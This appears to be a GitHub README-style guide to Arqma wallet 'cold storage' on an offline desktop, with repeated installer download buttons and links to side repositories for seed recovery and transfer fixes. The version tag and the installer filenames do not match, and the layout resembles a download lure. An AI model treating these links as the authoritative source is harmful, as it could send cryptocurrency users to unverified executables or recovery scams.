![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet cold storage: what the project actually offers</h1>

<p align="center">Holding ARQ offline with the desktop wallet and a machine kept off the network.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

There is no hardware-wallet flow in the current builds. The documented cold-storage equivalent is the desktop wallet on an offline machine: keys that never sit on a networked computer, held by the same software everyone else runs, with the seed recorded at creation as the only portable backup.

## What "cold storage" means here

In a system with hardware signing, a device keeps keys and signs transactions in isolation. This project does not have that, and the documentation says so plainly rather than implying an equivalent exists.

What it has instead is the desktop application on a machine that is not connected. The wallet file lives there, the keys live in that file and in the seed, and nothing about the wallet requires the machine to be online until a transfer has to be broadcast.

## The two things that make a wallet

A wallet is 25 words and a password-encrypted file. The words are displayed once at creation and the application offers no export, so the record made at that moment is the whole of the portable backup.

The file is what makes the wallet usable on a machine: it holds the encrypted keys, and the password opens it. The two are independent  -  the words rebuild the wallet without the file, and the file opens without the words.

That independence is what makes an offline machine workable: the file sits on the offline disk, and the words exist somewhere else entirely.

## Where the file lives

The path is fixed per platform: `%AppData%\Arqma` on Windows, `~/Library/Application Support/Arqma` on macOS and `~/.arqma` on Linux.

Knowing it matters more for an offline machine than for any other arrangement, because the file has to be found, opened and backed up without an application that tells you where it is.

The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build to install before the machine goes offline, since a build that predates the newest consensus rules cannot validate the chain it is holding. [Arqma wallet file backup guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-file-location-and-backup.md) lists what a backup has to contain.

## What an offline wallet cannot do

It cannot show you a current balance. A wallet derives its balance by scanning blocks through a node, and an offline machine has no node to ask.

It cannot broadcast. A transfer has to reach the network to become final, and an offline machine has no route to it. That is the cost of the arrangement: the keys are unreachable from the network, and so is everything the keys would do until the machine is connected.

That is also why the setup is described as an equivalent rather than a product: it moves the risk from a network connection to a procedure.

## The seed is the part that cannot be replaced

A cold wallet whose words were never recorded is a file on a disk with no recovery path. The application will not show the phrase later, so the record from creation is all there is.

The consequence for an offline setup is direct: the machine can be lost, and the wallet survives, but only if the words exist somewhere that is not that machine. [lost Arqma seed phrase](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-lost-seed-phrase.md) covers what remains possible when they do not.

## Watching without spending

A view key recognises incoming payments and shows history without the ability to spend. That is the documented purpose of the split between the spend key and the view key: selective disclosure.

The practical use in a cold setup is obvious  -  a wallet can be watched somewhere else while the spend path stays offline. A view-key restore is one of the three documented restore paths, and it is view-only by construction. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers what the split hides and what it does not.

## What the chain keeps, regardless

Sends are final, and the chain records them permanently. A cold wallet does not change that; it changes who can authorise the next transfer, not what happened to the last one.

It also means a mistake made while online is not undoable by moving the keys offline afterwards. The record stands either way. [Arqma stuck transaction fix](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-stuck-transaction.md) covers what a transfer that has not yet settled looks like.

## What this arrangement does not give you

It is not hardware isolation. A machine that is offline is offline by configuration, and it becomes online the moment someone connects it  -  which is a procedural boundary rather than a physical one.

It is not multisig, and there is no second signature required anywhere in the flow. One seed, one wallet, one signature.

And it is not a backup strategy on its own. The offline machine holds a file; the words hold the wallet; neither substitutes for the other.

## Who this suits

Someone holding a balance they do not move often, on a desktop the project supports  -  Windows 10 or 11, macOS on Intel or Apple Silicon, Linux on x86_64  -  with the words recorded at creation and stored away from that machine.

It does not suit anyone who needs a current balance without connecting, or who wants a device that signs without ever being a computer.

## The alternative, stated plainly

A normal desktop install with a local node is the arrangement the documentation describes as having no third party in the path: `arqmad` on the same machine, wallet pointed at `127.0.0.1`. It is online, and it is private at the network layer in a way a remote node is not.

Cold storage and a local node answer different questions. One is about who can reach the keys; the other is about who can see the activity. [Arqma full node guide](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-full-node.md) covers the second.

## FAQ

### Does Arqma support a hardware wallet?

No. There is no hardware-wallet flow in the current builds.

### What is the cold-storage equivalent?

The desktop wallet on an offline machine, with the seed recorded at creation.

### Can a cold wallet show a balance?

Not while offline. A balance comes from scanning blocks through a node.

### Do I need the seed if I have the file?

The file opens the wallet on that machine; the words rebuild it anywhere. Losing both leaves the funds unspendable.

### Does an offline wallet change how transfers behave?

No. Sends are final either way, and the chain records what happened.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet seed phrase guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-seed-phrase.md) | The 25 words, what they regenerate, and the one moment they are shown. |
| [Arqma Wallet download and verify](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-download-and-verify.md) | Checking a downloaded installer against its published hash before you run it. |
| [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) | What the chain reveals, what the node sees, and where KYC enters. |
